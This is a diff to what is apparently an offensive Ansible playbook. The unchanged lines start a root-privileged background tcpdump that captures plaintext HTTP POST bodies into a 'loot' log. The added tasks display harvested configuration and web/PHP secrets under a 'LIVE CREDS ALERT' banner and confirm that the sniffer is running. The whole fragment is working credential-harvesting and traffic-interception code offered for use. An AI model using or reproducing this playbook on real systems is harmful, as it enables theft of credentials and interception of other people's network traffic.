@@ -36,3 +36,15 @@
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
   run_once: true
   become: yes
+
+- name: "LIVE CREDS ALERT: {{ inventory_hostname }}"
+  debug:
+    msg: 
+      - "Config Files: {{ config_secrets.stdout_lines | default(['None']) }}"
+      - "Web/PHP: {{ web_secrets.stdout_lines | default(['None']) }}"
+  when: (config_secrets.stdout != "") or (web_secrets.stdout != "")
+
+- name: "SNIFFER STATUS"
+  debug:
+    msg: "Background Sniffer is now logging POST requests to {{ playbook_dir }}/loot/network_sniff.log"
+  run_once: true
